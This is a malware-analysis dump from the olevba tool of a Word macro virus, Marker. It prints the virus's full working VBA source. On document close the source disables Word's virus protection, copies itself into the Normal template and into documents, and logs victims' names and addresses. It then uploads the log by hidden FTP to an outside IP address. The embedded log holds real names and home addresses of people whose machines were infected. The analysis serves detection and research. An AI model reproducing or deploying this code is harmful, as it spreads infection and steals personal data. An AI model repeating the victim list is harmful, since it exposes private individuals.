olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq2-e74863e7abd612bfb53f155f0a7ad11b79201d40
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fq2-e74863e7abd612bfb53f155f0a7ad11b79201d40 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is a marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False

    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsf" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
   


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 11:16:41 AM - Wednesday, 23 Dec 1998
' BCBSA
'



' 01:30:35 PM - Wednesday, 30 Dec 1998
' BCBSA
'



' 01:36:45 PM - Monday, 4 Jan 1999
' Sue Rosinski
'



' 03:03:59 PM - Tuesday, 5 Jan 1999
' BCBSA
'



' 03:27:35 PM - Wednesday, 13 Jan 1999
' BCBSA
'



' 07:08:00 AM - Friday, 15 Jan 1999
' Kelly Ellerbee
'



' 02:53:22 PM - Wednesday, 20 Jan 1999
' Nicole Fisher
'



' 10:55:38 AM - Tuesday, 26 Jan 1999
' Susan Logan Howard
'



' 12:25:29 PM - Monday, 1 Feb 1999
' cdunnat
' Dunnett
' 2366 Autumn Grove Circle
' Aurora, IL  60504



' 06:51:45 PM - Monday, 1 Feb 1999
' Kelley Drye & Warren LLP
'



' 11:32:52 AM - Tuesday, 2 Feb 1999
' Kelley Drye & Warren LLP
'



' 09:13:24 PM - Wednesday, 10 Feb 1999
' Colleen McCloskey
' C. A. McCloskey
' 3 Mosher Road
' Princeton, NJ  08540



' 08:54:45 AM - Wednesday, 17 Feb 1999
' John W. Knapp, Jr.
'



' 09:39:44 AM - Friday, 19 Feb 1999
' bdl6p80
'



' 01:14:23 PM - Tuesday, 23 Feb 1999
' bd4kxwk
'



' 06:14:26 PM - Monday, 1 Mar 1999
' Julia Stapleton
'



' 10:58:07 AM - Tuesday, 9 Mar 1999
' Juanita Unhoch
'



' 04:31:16 PM - Tuesday, 23 Mar 1999
' lkumar
'



' 01:01:19 PM - Wednesday, 7 Apr 1999
' lkumar
'



' 08:37:37 AM - Tuesday, 14 Apr 1998
' setwei
'



' 01:38:14 PM - Thursday, 25 Mar 1999
' davver
'



' 10:55:13 AM - Tuesday, 20 Apr 1999
' faiper
'



' 11:04:24 AM - Friday, 23 Apr 1999
' jenwan
'



' 09:36:22 PM - Thursday, 13 May 1999
' Dinesh Parikh
'



' 09:24:37 AM - Thursday, 20 May 1999
' Administrator
'



' 12:04:37 PM - Wednesday, 30 Jun 1999
' Administrator
'



' 10:51:03 AM - Tuesday, 13 Jul 1999
' Administrator
'



' 04:46:37 PM - Thursday, 15 Jul 1999
' Administrator
'



' 03:46:04 PM - Monday, 26 Jul 1999
' Administrator
'



' 08:22:55 PM - Thursday, 12 Aug 1999
' CYRIL MERICKO
'



' 09:27:16 AM - Wednesday, 22 Sep 1999
' Gideon Weingarten
'



' 03:09:15 PM - Thursday, 16 Dec 1999
' ism
' Walter Jones
' 10 Garmany Place
' Yonkers, NY  10710



' 06:34:55 PM - Monday, 3 Jan 2000
' Righard J. Zwienenberg
'



' 03:04:17  - âòîðíèê, 4 ÿíâ 2000
' Replication System
'



' 11:43:59  - Dienstag, 6 Mrz 2001
' Andreas Marx
'


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

